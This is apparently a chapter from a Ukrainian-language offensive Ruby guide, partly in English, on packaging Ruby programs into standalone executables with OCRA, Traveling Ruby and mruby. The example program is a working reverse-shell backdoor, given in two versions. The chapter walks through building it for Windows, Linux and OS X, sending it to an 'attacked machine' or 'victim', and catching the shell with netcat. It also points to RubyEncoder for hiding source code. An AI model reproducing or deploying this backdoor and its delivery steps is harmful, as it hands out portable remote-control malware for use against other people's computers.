# модуль 0x2 | Системне Кнуг-Фу

## Пакування

Може виникнути питання про написання самостійних програм, яким для роботи не потрібно мати встановленого в системі Рубі. І дійсно, атакуючи якийсь комп'ютер, ми не можемо гарантувати що на ній буде встановлено Рубі і це проблема. В цьому розділі ми покажемо деякі шляхи як вирішити цю проблему.

### Збирач Рубі Застосункав в один клік(OCRA Builder)
OCRA (One-Click Ruby Application) збирає програму під Windows використовуючи вихідний код на Рубі. Результатом роботи збирача буде готова програма, яка міститиме в собі інтерпретатор Рубі, ваш вихідний код, а також необхідні dll бібліотеки.

**Це працює тілки в Windows**, насправді ні ;)

- Можливості
> - LZMA Компресія (ввімкнено за замовченням)
> - Підтримка Ruby 1.8.7, 1.9.3, 2.0.0 а також 2.1.5 
> - Підтримку/ як віконний так і консольний режими
> - Включає потрібні для роботи геми, або геми вказані в Gemfile

- Установка OCRA
```
gem install ocra
```
Отже все що залишилося, так це мати програму, що ми збиратимемо.
Припустимо, в нас ж наступний скрипт, бекдор звісно ж ;)

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'socket'
if ARGV[0].nil? || ARGV[1].nil?
    puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
    exit
end
ip, port = ARGV
s = TCPSocket.new(ip,port)
while cmd = s.gets
  IO.popen(cmd,"r"){|io|s.print io.read}
end
```

І тепер на вашому комп'ютері з ОС Windows виконайте наступну команду в cmd.exe
```
C:\Users\admin\Desktop>ocra rshell.rb --windows --console
```

Результат: 

```
C:\Users\admin\Desktop>ocra rshell.rb --windows --console
=== Loading script to check dependencies
ruby C:/Users/admin/Desktop/rshell.rb.rb [HACKER_IP HACKER_PORT]

=== Attempting to trigger autoload of Gem::ConfigFile
=== Attempting to trigger autoload of Gem::DependencyList
=== Attempting to trigger autoload of Gem::DependencyResolver
=== Attempting to trigger autoload of Gem::Installer
=== Attempting to trigger autoload of Gem::RequestSet
=== Attempting to trigger autoload of Gem::Source
=== Attempting to trigger autoload of Gem::SourceList
=== Attempting to trigger autoload of Gem::SpecFetcher
=== Attempting to trigger autoload of CGI::HtmlExtension
=== Detected gem ocra-1.3.5 (loaded, files)
===     6 files, 191333 bytes
=== Detected gem io-console-0.4.3 (loaded, files)
=== WARNING: Gem io-console-0.4.3 root folder was not found, skipping
=== Including 53 encoding support files (3424768 bytes, use --no-enc to exclude)
=== Building rshell.exe
=== Adding user-supplied source files
=== Adding ruby executable ruby.exe
=== Adding detected DLL C:/Ruby22/bin/zlib1.dll
=== Adding detected DLL C:/Ruby22/bin/LIBEAY32.dll
=== Adding detected DLL C:/Ruby22/bin/SSLEAY32.dll
=== Adding detected DLL C:/Ruby22/bin/libffi-6.dll
=== Adding library files
=== Compressing 10622666 bytes
=== Finished building rshell.exe (2756229 bytes)
```

В тій самій теці, звідки ви запустили команди має з'явитися новий `rshell.exe` файл. Відправте його на атаковану машину, яка не має встановленого Рубі та запустіть.

```
rshell.exe 192.168.0.14 9911 
```
якщо все ок, то з нашої атакованої машини матимемо відкритий порт 9911 на якому буде працювати наш бекдор.
```
nc -lvp 9911
```
![](packaging__ocra1.png)



### Мандруючий Рубі(Traveling-ruby)
З офіційного сайту[^1] "*Мандруючий рубі - проект який постачає запаковані, портативні рубі програми, які можуть бути запущеними на всіх Лінукс та MAc OS X системах. Також існує підтримка систем Windows(з деякими обмеженнями). Це надає розробникам Рубі програм поставляти ці програми з їх Рубі кодом як один цілісний файл-пакет, без необхідності користувачам встановлювати рубі та геми.*"

Увага: Наступні інструкції взято з їх офіційного сайту.

#### Підготовка  
```
mkdir rshell
cd rshell
```
- Напишіть програму -в нашому випадку бекдор- із теки "rshell"

**rshell.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'socket'
if ARGV.size < 2
  puts "ruby #{__FILE__}.rb [HACKER_IP  HACKER_PORT]\n\n"
  exit 0 
end
ip, port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
```

- Перевірте її

```
ruby rshell.rb 
# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]
```



##### Створення дерикторії з пакетом
Наступним кроком є підготовка пакетів для всіє необхідних платформ. Для цього створимо окремі теки для кожної платформи й скопіюємо вашу програму в кожну з них(Припускаючи що ваша програма може трохи різнитися в залежності від платформи)

```
mkdir -p rshell-1.0.0-linux-x86/lib/app
cp rshell.rb rshell-1.0.0-linux-x86/lib/app/

mkdir -p rshell-1.0.0-linux-x86_64/lib/app
cp rshell.rb rshell-1.0.0-linux-x86_64/lib/app/

mkdir -p rshell-1.0.0-osx/lib/app/
cp rshell.rb rshell-1.0.0-osx/lib/app/
```

Далі створіть теку `packaging` та завантажте Traveling Ruby для кожної платформи у відповідні директорії. Ви можете також завантажити ці файли з "http://d6r77u77i8pq3.cloudfront.net". В цій книзі використано версію 20141215-2.1.5.

```
mkdir packaging
cd packaging
wget -c  http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-20141215-2.1.5-linux-x86.tar.gz
wget -c  http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-20141215-2.1.5-linux-x86_64.tar.gz
wget -c  http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-20141215-2.1.5-osx.tar.gz
cd ..

mkdir rshell-1.0.0-linux-x86/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.1.5-linux-x86.tar.gz -C rshell-1.0.0-linux-x86/lib/ruby
mkdir rshell-1.0.0-linux-x86_64/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.1.5-linux-x86_64.tar.gz -C rshell-1.0.0-linux-x86_64/lib/ruby
mkdir rshell-1.0.0-osx/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.1.5-osx.tar.gz -C rshell-1.0.0-osx/lib/ruby
```

Тепер в кожній теці ви матимете бінарний файл вашої програми. Це виглядатиме якось так:

```
rshell/
 |
 +-- rshell.rb
 |
 +-- rshell-linux86/
 |   |
 |   +-- lib/
 |       +-- app/
 |       |   |
 |       |   +-- rshell.rb
 |       |
 |       +-- ruby/
 |           |
 |           +-- bin/
 |           |   |
 |           |   +-- ruby
 |           |   +-- ...
 |           +-- ...
 |
 +-- rshell-linux86_64/
 |   |
 |  ...
 |
 +-- rshell-osx/
     |
    ...
```

##### Швидкий перевірочний тест
Давайте перевіримо нашу майже зібрану програму. Якщо ви все робили на вашому Mac OS X, то просто виконайте наступну команду:

```
cd rshell-osx
./lib/ruby/bin/ruby lib/app/rshell.rb
# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]

cd ..
```


##### Створення обгортки програми
Тепер, як ви перевірили що збірка рубі пакетів працює як треба вам треба створити якусь обгортку(*wrapper script*). бо ви ж не хочете щоб користувачі постійно набирали `/path-to-your-app/lib/ruby/bin/ruby /path-to-your-app/lib/app/rshell.rb` аби запустити вагу програму. Вам би було краще аби вони запускали ххх якось так: `/path-to-your-app/rshell`.

Наступний код - це те, як наша обгортка може виглядати:


```bash
#!/bin/bash
set -e

# Дивимося де саме наш скрипт зараз знаходиться.
SELFDIR="`dirname \"$0\"`"
SELFDIR="`cd \"$SELFDIR\" && pwd`"

# Запуск програми.
exec "$SELFDIR/lib/ruby/bin/ruby" "$SELFDIR/lib/app/rshell.rb"
```

Збережіть цей файл як `packaging/wrapper.sh` в теці вашого проекту та скопіюйте в відповідні теки платформ перейменувавши в `rshell`:

```
chmod +x packaging/wrapper.sh
cp packaging/wrapper.sh rshell-1.0.0-linux-x86/rshell
cp packaging/wrapper.sh rshell-1.0.0-linux-x86_64/rshell
cp packaging/wrapper.sh rshell-1.0.0-osx/rshell
```


##### Остаточна запаковка
```
tar -czf rshell-1.0.0-linux-x86.tar.gz rshell-1.0.0-linux-x86
tar -czf rshell-1.0.0-linux-x86_64.tar.gz rshell-1.0.0-linux-x86_64
tar -czf rshell-1.0.0-osx.tar.gz rshell-1.0.0-osx
rm -rf rshell-1.0.0-linux-x86
rm -rf rshell-1.0.0-linux-x86_64
rm -rf rshell-1.0.0-osx
```

Вітаємо, ви створили нову програми використовуючи Traveling Ruby!

Тепер Лінукс користувач тепер може використовувати вашу програму ось так:

1. Користувач завантажує файл rshell-1.0.0-linux-x86.tar.gz.
2. Розпаковує його.
3. Та запускає:

```
/path-to/rshell-1.0.0-linux-x86/rshell
# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]

```

##### Автоматизація процесу
Робити всі ці кроки один за одним та ще й кіька разів це, як мінімум, не зручно, але ви можете автоматизувати цей процес, використовуючи, наприклад Rake. Ось так може виглядати ваш Rakefile:


```ruby
PACKAGE_NAME = "rshell"
VERSION = "1.0.0"
TRAVELING_RUBY_VERSION = "20150210-2.1.5"

desc "Запаковуємо програму"
task :package => ['package:linux:x86', 'package:linux:x86_64', 'package:osx']

namespace :package do
  namespace :linux do
    desc "Запаковуємо для Linux x86"
    task :x86 => "packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86.tar.gz" do
      create_package("linux-x86")
    end

    desc "Запаковуємо для Linux x86_64"
    task :x86_64 => "packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86_64.tar.gz" do
      create_package("linux-x86_64")
    end
  end

  desc "Запаковуємо для OS X"
  task :osx => "packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-osx.tar.gz" do
    create_package("osx")
  end
end

file "packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86.tar.gz" do
  download_runtime("linux-x86")
end

file "packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-linux-x86_64.tar.gz" do
  download_runtime("linux-x86_64")
end

file "packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-osx.tar.gz" do
  download_runtime("osx")
end

def create_package(target)
  package_dir = "#{PACKAGE_NAME}-#{VERSION}-#{target}"
  sh "rm -rf #{package_dir}"
  sh "mkdir -p #{package_dir}/lib/app"
  sh "cp rshell.rb #{package_dir}/lib/app/"
  sh "mkdir #{package_dir}/lib/ruby"
  sh "tar -xzf packaging/traveling-ruby-#{TRAVELING_RUBY_VERSION}-#{target}.tar.gz -C #{package_dir}/lib/ruby"
  sh "cp packaging/wrapper.sh #{package_dir}/rshell"
  if !ENV['DIR_ONLY']
    sh "tar -czf #{package_dir}.tar.gz #{package_dir}"
    sh "rm -rf #{package_dir}"
  end
end

def download_runtime(target)
  sh "cd packaging && curl -L -O --fail " +
    "http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-#{TRAVELING_RUBY_VERSION}-#{target}.tar.gz"
end

```

Відтепер ви можете створити всі 3 пакети виконавши наступну команду:

```
rake package
```

Або ж спакувати програму для однієї якоїсь з платформ:

```
rake package:linux:x86
rake package:linux:x86_64
rake package:osx
```

Або ж створити теки з пакетами не заархівовуючи їх в .tar.gz встановивши параметр DIR_ONLY=1:

```
rake package DIR_ONLY=1
rake package:linux:x86 DIR_ONLY=1
rake package:linux:x86_64 DIR_ONLY=1
rake package:osx DIR_ONLY=1
```


##### On Victim Machine


You now have three files which you can distribute to end users.

```
rshell-1.0.0-linux-x86.tar.gz
rshell-1.0.0-linux-x86_64.tar.gz
rshell-1.0.0-osx.tar.gz
```

Suppose the end user is on Linux x86_64. S/he uses your app by downloading rshell-1.0.0-linux-x86_64.tar.gz, extracting it and running it:

```
wget rshell-1.0.0-linux-x86_64.tar.gz
...
tar xzf rshell-1.0.0-linux-x86_64.tar.gz
cd rshell-1.0.0-linux-x86_64
./rshell
# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]

```

#### mruby
**mruby CLI**[^2] A utility for setting up a CLI with mruby that compiles binaries to Linux, OS X, and Windows.


##### Prerequisites
- mruby-cli
- Docker
- Docker Compose

##### Developer introduction
https://www.youtube.com/watch?v=OvuZ8R4Y9xA



## Close Source code
Sometimes we don't want to disclose our source code for whatever reason, but we still want to share our applications either commercially or for free. Here a commercial solution for that purpose, RubyEncoder.

**RubyEncoder**[^3] protects Ruby scripts by compiling Ruby source code into a bytecode format and this is followed by encryption. This protects your scripts from reverse engineering. Ruby scripts protected with RubyEncoder can be executed but cannot be used to extract Ruby source code as there is no source code remaining within the protected script in any form.







<br><br><br>
---
[^1]: Traveling-ruby: [Official website](http://phusion.github.io/traveling-ruby/)
[^2]: mruby CLI: [Official website](https://github.com/hone/mruby-cli)
[^3]: RubyEncoder: [Official website](http://rubyencoder.com)




